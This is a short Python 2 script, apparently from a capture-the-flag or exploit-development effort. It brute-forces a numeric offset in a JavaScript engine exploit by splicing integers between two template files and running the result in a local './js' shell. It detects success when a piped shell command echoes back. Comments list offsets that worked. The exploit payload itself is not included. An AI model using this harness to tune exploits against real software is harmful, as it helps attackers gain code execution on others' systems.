import subprocess

p=['./js','exp_.js']
pt_a=open("a.js").read()
pt_b=open("b.js").read()


#3502 is a sol
#3568
#3634
#3688
for i in xrange(3687,50000): 
    if 0 ==0:

        print i
    try:
        exp_=pt_a[:-1]+str(i)+pt_b
        fs=open("exp_.js","wb")
        fs.write(exp_) 
        fs.close()   
#        output = subprocess.check_output(p)
        p_ = subprocess.Popen(p,stdout=subprocess.PIPE,stdin=subprocess.PIPE)
        p_.stdin.write("echo fuck")
        ss=p_.communicate()[0]
        p_.stdin.close()
#        print ss
        if "fuck" in ss:
            print str(i)+" done"
            break
#        fs=open("success","wb")
#        fs.write(str(i))
#        fs.close()
         
    except subprocess.CalledProcessError as e:
        print "Failed "+str(i)
        pass      
#        print("failed: " + e.output)
